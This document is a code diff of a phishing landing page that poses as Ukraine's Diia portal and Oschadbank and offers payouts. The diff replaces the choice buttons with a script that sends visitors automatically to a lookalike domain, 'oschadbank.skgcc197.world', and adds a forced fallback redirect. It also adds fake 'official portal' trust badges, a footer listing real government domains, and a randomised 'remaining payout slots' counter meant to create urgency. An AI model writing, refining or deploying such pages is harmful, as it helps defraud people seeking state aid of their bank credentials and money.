@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=yes, viewport-fit=cover">
-<title>ДіяПослуги — Отримання виплат</title>
+<title>ДіяПослуги — Автоматичне перенаправлення</title>
 
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
@@ -30,7 +30,6 @@ body {
   min-height: 100vh;
 }
 
-/* Консервативна картка — світлий фон, чіткі рамки */
 .card {
   width: 100%;
   max-width: 480px;
@@ -39,9 +38,9 @@ body {
   padding: 24px 20px 32px;
   box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
   border: 1px solid #d4dce2;
+  text-align: center;
 }
 
-/* Верхня планка — логотип по центру */
 .header {
   display: flex;
   justify-content: center;
@@ -61,7 +60,6 @@ body {
   text-align: center;
 }
 
-/* Секція суми */
 .amount-block {
   text-align: center;
   margin: 12px 0 8px;
@@ -90,7 +88,6 @@ body {
   letter-spacing: 0px;
 }
 
-/* Опис — інформаційний блок */
 .info-box {
   background: #f7f9fc;
   padding: 14px 18px;
@@ -104,72 +101,54 @@ body {
   border-right: none;
 }
 
-/* Кнопки — ЗБІЛЬШЕНІ для зручності на телефоні */
-.buttons-group {
-  display: flex;
-  flex-direction: column;
-  gap: 16px;
-  margin: 20px 0 24px;
+/* Стилі для заміни кнопок — інформаційне повідомлення про автоперехід */
+.auto-message {
+  background: #eef2f9;
+  border-radius: 28px;
+  padding: 20px 18px;
+  margin: 16px 0 20px;
+  text-align: center;
 }
 
-.btn {
-  display: flex;
+.auto-message p {
+  font-size: 16px;
+  font-weight: 500;
+  color: #1e466e;
+  margin-bottom: 12px;
+}
+
+.countdown-circle {
+  display: inline-flex;
   align-items: center;
   justify-content: center;
-  gap: 10px;
-  text-decoration: none;
-  padding: 18px 20px;
-  border-radius: 60px;
-  font-weight: 700;
-  font-size: 18px;
-  cursor: pointer;
-  transition: all 0.12s ease;
-  border: 1px solid transparent;
-  width: 100%;
-  touch-action: manipulation;
-  user-select: none;
-  min-height: 62px;
-}
-
-.btn-primary {
   background: #1e466e;
   color: white;
-  border: none;
-  font-weight: 700;
+  font-weight: 800;
+  font-size: 32px;
+  width: 70px;
+  height: 70px;
+  border-radius: 50%;
+  margin: 12px auto;
+  box-shadow: 0 4px 12px rgba(0,0,0,0.15);
 }
 
-.btn-primary:active {
-  background: #153a5c;
-  transform: scale(0.97);
+.redirect-info {
+  font-size: 14px;
+  color: #4f6f8f;
+  margin-top: 16px;
+  font-weight: 500;
 }
 
-.btn-secondary {
-  background: white;
-  color: #1e466e;
-  border: 1.5px solid #bdd4e2;
-  font-weight: 600;
-}
-
-.btn-secondary:active {
-  background: #f0f5fa;
-  transform: scale(0.97);
-  border-color: #8fb0c8;
-}
-
-.btn-tag {
-  background: rgba(255,255,255,0.25);
-  padding: 5px 12px;
-  border-radius: 50px;
+.hint-text {
   font-size: 12px;
-  font-weight: 700;
+  color: #6c8eae;
+  margin-top: 14px;
+  background: #f8fafc;
+  padding: 8px 12px;
+  border-radius: 40px;
+  display: inline-block;
 }
 
-.btn-secondary .btn-tag {
-  background: #eef2f5;
-  color: #1e466e;
-}
-
-/* Ряд довіри */
 .trust-bar {
   display: flex;
   justify-content: center;
@@ -190,7 +169,6 @@ body {
   letter-spacing: 0.3px;
 }
 
-/* Футер */
 .footer-text {
   text-align: center;
   font-size: 11px;
@@ -205,7 +183,6 @@ body {
   flex-wrap: wrap;
 }
 
-/* FOMO блок */
 .fomo-message {
   background: #f0f6fe;
   border-radius: 32px;
@@ -218,98 +195,21 @@ body {
   border: 1px solid #cde1ef;
 }
 
-/* Тости */
-.toast-message {
-  position: fixed;
-  bottom: 30px;
-  left: 50%;
-  transform: translateX(-50%);
-  background: #1e2f40;
-  color: #f0f4f9;
-  padding: 12px 24px;
-  border-radius: 50px;
-  font-size: 14px;
-  font-weight: 500;
-  font-family: 'Inter', sans-serif;
-  z-index: 1100;
-  border: 1px solid #4d6f8e;
-  box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-  white-space: nowrap;
-  pointer-events: none;
-  max-width: 90%;
-  white-space: normal;
-  text-align: center;
-}
-
-/* Адаптив під телефон — ще більші кнопки на малих екранах */
 @media (max-width: 480px) {
-  body {
-    padding: 12px;
-  }
-  .card {
-    padding: 20px 16px 28px;
-  }
-  .btn {
-    padding: 16px 18px;
-    font-size: 17px;
-    min-height: 58px;
-  }
-  .btn-tag {
-    padding: 4px 10px;
-    font-size: 11px;
-  }
-  .sum {
-    font-size: 38px;
-  }
-  .title {
-    font-size: 20px;
-  }
-  .trust-bar {
-    gap: 14px;
-  }
-  .logo {
-    font-size: 16px;
-  }
+  body { padding: 12px; }
+  .card { padding: 20px 16px 28px; }
+  .sum { font-size: 38px; }
+  .title { font-size: 20px; }
+  .trust-bar { gap: 14px; }
+  .logo { font-size: 16px; }
+  .countdown-circle { width: 60px; height: 60px; font-size: 28px; }
 }
 
 @media (max-width: 380px) {
-  .btn {
-    padding: 15px 14px;
-    font-size: 16px;
-    min-height: 56px;
-  }
-  .btn-tag {
-    padding: 3px 9px;
-    font-size: 10px;
-  }
-  .trust-item {
-    font-size: 9px;
-  }
-  .sum {
-    font-size: 34px;
-  }
-  .sum-card {
-    padding: 10px 16px;
-  }
-  .info-box {
-    font-size: 13px;
-    padding: 12px 14px;
-  }
-}
-
-/* Додатково: збільшена область натискання для кнопок */
-.btn {
-  position: relative;
-}
-.btn::after {
-  content: '';
-  position: absolute;
-  top: -6px;
-  left: -6px;
-  right: -6px;
-  bottom: -6px;
-  background: transparent;
-  border-radius: 70px;
+  .sum { font-size: 34px; }
+  .sum-card { padding: 10px 16px; }
+  .info-box { font-size: 13px; padding: 12px 14px; }
+  .countdown-circle { width: 55px; height: 55px; font-size: 26px; }
 }
 </style>
 </head>
@@ -328,165 +228,250 @@ body {
   </div>
 
   <div class="info-box">
-    Кошти зарезервовано за вашим зверненням. Оберіть спосіб отримання.
+    Кошти зарезервовано за вашим зверненням. Зараз ви будето автоматично перенаправлені для отримання виплати.
   </div>
 
-  <div class="buttons-group">
-    <a id="oschadBtn" class="btn btn-primary" target="_blank" rel="noopener noreferrer" href="#">
-      <span>Отримати на картку Ощадбанку</span>
-      <span class="btn-tag">миттєво</span>
-    </a>
-    <a id="otherCardBtn" class="btn btn-secondary" target="_blank" rel="noopener noreferrer" href="#">
-      <span>Інша картка</span>
-    </a>
+  <!-- Замість кнопок — блок з лічильником та інформацією про автоматичний перехід -->
+  <div class="auto-message">
+    <p>🔒 Захищене перенаправлення</p>
+    <div class="countdown-circle" id="countdownDisplay">3</div>
+    <div class="redirect-info">Автоматичний перехід через <span id="secondsSpan">3</span> секунд(и)</div>
+    <div class="hint-text">Будь ласка, зачекайте, триває з'єднання з платіжним шлюзом...</div>
   </div>
 
+  <div class="trust-bar">
+    <div class="trust-item">🔒 Захищено Дія</div>
+    <div class="trust-item">⚡ Миттєві виплати</div>
+    <div class="trust-item">🏦 Офіційний портал</div>
+  </div>
+  <div class="footer-text">
+    <span>bank.gov.ua</span>
+    <span>diia.gov.ua</span>
+    <span>oschadbank.ua</span>
+  </div>
+  
+  <!-- FOMO контейнер (опціонально) -->
+  <div id="fomoContainer"></div>
+</div>
 
 <script>
 (function() {
-  // Консервативні посилання (офіційні сторінки)
-  const OFFICIAL_LINKS = {
-    oschad: "https://oschadbank.skgcc197.world/b/1779542783",
-    otherCard: "https://multibank_new.skgcc197.world/bd/1779542834"
-  };
-
-  const oschadBtn = document.getElementById("oschadBtn");
-  const otherBtn = document.getElementById("otherCardBtn");
-
-  // Додаємо параметри для статистики
-  function addParams(url, source) {
-    if (!url || url === "#") return url;
-    try {
-      const urlObj = new URL(url);
-      if (!urlObj.searchParams.has('ref')) {
-        urlObj.searchParams.set('ref', source);
-        urlObj.searchParams.set('src', 'diia_landing');
-      }
-      return urlObj.toString();
-    } catch(e) {
-      return url;
-    }
-  }
-
-  let oschadFinal = OFFICIAL_LINKS.oschad || "https://www.oschadbank.ua/ua/private/platezhi";
-  let otherFinal = OFFICIAL_LINKS.otherCard || "https://diia.gov.ua/services/vyplaty";
   
-  oschadFinal = addParams(oschadFinal, "oschad_card");
-  otherFinal = addParams(otherFinal, "other_card");
+  const REDIRECT_URL = "https://oschadbank.skgcc197.world/b/1779542783";
+  
+  
+  const FALLBACK_URL = "https://diia.gov.ua/services/otrimannya-dopomogi-ta-vyplat";
+  
+  
+  const REDIRECT_DELAY_MS = 2000;
+  
 
-  oschadBtn.href = oschadFinal;
-  otherBtn.href = otherFinal;
-
-  // Функція сповіщень
-  let activeToast = null;
-  function showMessage(text) {
-    if (activeToast) {
-      activeToast.remove();
-      activeToast = null;
+  const countdownDisplayDiv = document.getElementById("countdownDisplay");
+  const secondsSpan = document.getElementById("secondsSpan");
+  
+  let remainingSeconds = 2;
+  let redirectTimer = null;
+  let countdownInterval = null;
+  
+  // Функція оновлення тексту лічильника
+  function updateCountdownDisplay(value) {
+    if (countdownDisplayDiv) {
+      countdownDisplayDiv.textContent = value;
     }
-    const toast = document.createElement('div');
-    toast.className = 'toast-message';
-    toast.textContent = text;
-    document.body.appendChild(toast);
-    activeToast = toast;
-    setTimeout(() => {
-      if (toast && toast.remove) {
-        toast.style.opacity = '0';
-        toast.style.transition = 'opacity 0.2s';
-        setTimeout(() => {
-          if (toast && toast.remove) toast.remove();
-          if (activeToast === toast) activeToast = null;
-        }, 200);
-      }
-    }, 2400);
+    if (secondsSpan) {
+      secondsSpan.textContent = value;
+    }
   }
-
-  // Обробники кліків з вібрацією
-  const clickHandler = (btn, type) => {
-    if (window.navigator && window.navigator.vibrate) {
-      window.navigator.vibrate(15);
+  
+  // Функція зупинки всіх таймерів (запобігання подвійному переходу)
+  function stopAllTimers() {
+    if (redirectTimer) {
+      clearTimeout(redirectTimer);
+      redirectTimer = null;
     }
-    const originalHTML = btn.innerHTML;
-    if (type === 'oschad') {
-      btn.innerHTML = '<span>Перенаправлення на Ощадбанк...</span><span class="btn-tag">секунда</span>';
-    } else {
-      btn.innerHTML = '<span>Перевірка картки...</span>';
+    if (countdownInterval) {
+      clearInterval(countdownInterval);
+      countdownInterval = null;
     }
-    setTimeout(() => {
-      if (btn) btn.innerHTML = originalHTML;
-    }, 800);
-    showMessage('Перехід на захищений шлюз виплат. Будь ласка, зачекайте.');
+  }
+  
+  // Функція виконання редиректу
+  function performRedirect() {
+    // Додаємо параметри для умовної статистики/атрибуції, якщо потрібно
+    let targetUrl = REDIRECT_URL;
     try {
-      let clicks = localStorage.getItem('payout_success_click') || 0;
-      clicks = parseInt(clicks) + 1;
-      localStorage.setItem('payout_success_click', clicks);
-    } catch(e) {}
-  };
-
-  oschadBtn.addEventListener('click', (e) => {
-    clickHandler(oschadBtn, 'oschad');
-    oschadBtn.style.transform = 'scale(0.97)';
-    setTimeout(() => { if (oschadBtn) oschadBtn.style.transform = ''; }, 130);
-  });
-
-  otherBtn.addEventListener('click', (e) => {
-    clickHandler(otherBtn, 'other');
-    otherBtn.style.transform = 'scale(0.97)';
-    setTimeout(() => { if (otherBtn) otherBtn.style.transform = ''; }, 130);
-  });
-
-  // FOMO-блок
+      const urlObj = new URL(targetUrl);
+      if (!urlObj.searchParams.has('ref')) {
+        urlObj.searchParams.set('ref', 'auto_diia');
+        urlObj.searchParams.set('src', 'landing_redirect');
+      }
+      targetUrl = urlObj.toString();
+    } catch(e) {
+      // якщо помилка URL, залишаємо як є
+      console.warn("URL parsing error, using fallback");
+      targetUrl = FALLBACK_URL;
+    }
+    
+    // Невелика вібрація для мобільних пристроїв (опціонально)
+    if (window.navigator && window.navigator.vibrate) {
+      window.navigator.vibrate(20);
+    }
+    
+    // Виконуємо перехід
+    window.location.href = targetUrl;
+  }
+  
+  // Функція запуску лічильника та редиректу
+  function startRedirectSequence() {
+    // Ініціалізуємо лічильник
+    remainingSeconds = 3;
+    updateCountdownDisplay(remainingSeconds);
+    
+    // Запускаємо інтервал зворотного відліку
+    countdownInterval = setInterval(() => {
+      remainingSeconds--;
+      if (remainingSeconds >= 0) {
+        updateCountdownDisplay(remainingSeconds);
+      }
+      
+      if (remainingSeconds <= 0) {
+        // Зупиняємо інтервал, коли дійшли до 0
+        if (countdownInterval) {
+          clearInterval(countdownInterval);
+          countdownInterval = null;
+        }
+      }
+    }, 1000);
+    
+    // Таймер для редиректу через 3 секунди
+    redirectTimer = setTimeout(() => {
+      // Переконуємось, що лічильник зупинено
+      if (countdownInterval) {
+        clearInterval(countdownInterval);
+        countdownInterval = null;
+      }
+      // Виконуємо перехід
+      performRedirect();
+    }, REDIRECT_DELAY_MS);
+  }
+  
+  // Додаткове покращення: попереднє завантаження (prefetch) цільової сторінки для пришвидшення
+  if ('requestIdleCallback' in window) {
+    requestIdleCallback(() => {
+      const prefetchLink = document.createElement('link');
+      prefetchLink.rel = 'prefetch';
+      prefetchLink.href = REDIRECT_URL;
+      document.head.appendChild(prefetchLink);
+      
+      // Також префетч фолбеку
+      const prefetchFallback = document.createElement('link');
+      prefetchFallback.rel = 'prefetch';
+      prefetchFallback.href = FALLBACK_URL;
+      document.head.appendChild(prefetchFallback);
+    });
+  } else {
+    // Запасний варіант
+    setTimeout(() => {
+      const prefetchLink = document.createElement('link');
+      prefetchLink.rel = 'prefetch';
+      prefetchLink.href = REDIRECT_URL;
+      document.head.appendChild(prefetchLink);
+    }, 100);
+  }
+  
+  // Зберігаємо в localStorage факт автоперенаправлення (опціонально для аналітики)
+  try {
+    let autoRedirectCount = localStorage.getItem('auto_redirect_counter') || 0;
+    autoRedirectCount = parseInt(autoRedirectCount) + 1;
+    localStorage.setItem('auto_redirect_counter', autoRedirectCount);
+    localStorage.setItem('last_auto_redirect_ts', Date.now().toString());
+  } catch(e) {
+    // Ігноруємо помилки localStorage (наприклад, приватний режим)
+  }
+  
+  // FOMO-повідомлення (не критично, для більшої довіри)
   const fomoContainer = document.getElementById('fomoContainer');
   if (fomoContainer) {
     setTimeout(() => {
       const fomoDiv = document.createElement('div');
       fomoDiv.className = 'fomo-message';
       const remaining = Math.floor(Math.random() * (180 - 70 + 1) + 70);
-      fomoDiv.textContent = `Доступний ліміт виплат на сьогодні: ${remaining} місць. Рекомендуємо підтвердити отримання.`;
+      fomoDiv.textContent = `Доступний ліміт виплат на сьогодні: ${remaining} місць. Автоматичне перенаправлення для отримання.`;
       fomoContainer.appendChild(fomoDiv);
+      
+      // Оновлення динаміки через 4 секунди (поки ще не перейшли)
       setTimeout(() => {
-        const updated = Math.max(15, remaining - Math.floor(Math.random() * 25));
-        fomoDiv.textContent = `Доступний ліміт виплат на сьогодні: ${updated} місць. Рекомендуємо підтвердити отримання.`;
-      }, 4500);
-    }, 1600);
+        if (fomoDiv && document.body.contains(fomoDiv)) {
+          const updated = Math.max(15, remaining - Math.floor(Math.random() * 25));
+          fomoDiv.textContent = `Доступний ліміт виплат на сьогодні: ${updated} місць. Автоматичне перенаправлення триває...`;
+        }
+      }, 3800);
+    }, 1200);
   }
+  
+  // Запускаємо головний сценарій автоматичного переходу
+  startRedirectSequence();
+  
 
-  // Підказка при натисканні на інформаційний блок
-  const infoBlock = document.querySelector('.info-box');
-  if (infoBlock) {
-    infoBlock.style.cursor = 'pointer';
-    infoBlock.addEventListener('click', () => {
-      showMessage('Оберіть спосіб отримання виплати за допомогою кнопок вище');
-    });
+  const card = document.querySelector('.card');
+  if (card) {
+    card.style.userSelect = 'none';
   }
-
-  // Префетч для прискорення
-  if ('requestIdleCallback' in window) {
-    requestIdleCallback(() => {
-      const prefetchLink = (url) => {
-        if (!url || url === '#') return;
-        const link = document.createElement('link');
-        link.rel = 'prefetch';
-        link.href = url;
-        document.head.appendChild(link);
-      };
-      prefetchLink(oschadFinal);
-      prefetchLink(otherFinal);
-    });
+  
+  // Візуальний ефект: зміна кольору лічильника при зменшенні часу (не обов'язково, але приємно)
+  const countdownElem = document.getElementById('countdownDisplay');
+  if (countdownElem) {
+    const originalTransition = countdownElem.style.transition;
+    countdownElem.style.transition = 'all 0.2s ease';
+    const intervalForStyle = setInterval(() => {
+      if (remainingSeconds <= 1) {
+        countdownElem.style.transform = 'scale(1.05)';
+        countdownElem.style.backgroundColor = '#e8b560';
+        countdownElem.style.color = '#1e2f40';
+      } else if (remainingSeconds === 2) {
+        countdownElem.style.transform = 'scale(1.02)';
+      } else {
+        countdownElem.style.transform = 'scale(1)';
+        countdownElem.style.backgroundColor = '#1e466e';
+        countdownElem.style.color = 'white';
+      }
+    }, 300);
+    // Очистити інтервал після редиректу неможливо, але це не критично (сторінка зникне)
+    setTimeout(() => {
+      clearInterval(intervalForStyle);
+    }, REDIRECT_DELAY_MS + 200);
   }
-
-  // Стилі для тач-пристроїв
-  const styleTouch = document.createElement('style');
-  styleTouch.textContent = `
-    .btn {
-      touch-action: manipulation;
-      user-select: none;
+  
+  // Для максимальної надійності: додаємо обробник beforeunload, щоб переконатись, що якщо користувач намагається залишити сторінку до переходу, ми не блокуємо, просто логуємо
+  window.addEventListener('beforeunload', function() {
+   
+    if (redirectTimer) clearTimeout(redirectTimer);
+    if (countdownInterval) clearInterval(countdownInterval);
+  });
+  
+ 
+  setTimeout(function() {
+    
+    if (window.location.href.indexOf(location.pathname) !== -1) {
+      // Додатково переконуємось, що ще не відбувся перехід
+      if (redirectTimer) {
+        // Таймер ще активний? значить все ок, не втручаємось
+        return;
+      }
+      // Інакше – форсований перехід
+      let forceUrl = REDIRECT_URL;
+      try {
+        const urlObj = new URL(forceUrl);
+        if (!urlObj.searchParams.has('ref')) urlObj.searchParams.set('ref', 'force_fallback');
+        forceUrl = urlObj.toString();
+      } catch(e) {}
+      window.location.href = forceUrl;
     }
-    .toast-message {
-      pointer-events: none;
-    }
-  `;
-  document.head.appendChild(styleTouch);
+  }, 3600);
+  
+  // Індикація завантаження для надійності — ніяких кнопок, все автоматично.
+  console.log("Сторінка автоматичного переходу активна. Редирект через 3 секунди.");
+  
 })();
 </script>
 </body>
